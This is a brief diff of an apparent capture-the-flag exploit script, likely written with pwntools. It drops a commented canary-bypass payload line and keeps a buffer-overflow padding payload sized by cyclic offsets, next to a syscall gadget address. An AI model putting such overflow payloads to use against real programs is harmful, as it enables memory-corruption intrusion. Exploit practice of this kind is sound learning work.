@@ -44,8 +44,6 @@ def cyclic_find_bytes(b):
     return cyclic_find(to_be_found)
 
 
-#payload = b"A"*canary_offset+canary_bytes+b"B"*cyclic_find_bytes(0x61616167)
-
 payload = b"A"*cyclic_find_bytes(0x63616163)
 
 syscall_ret = 0x40103c
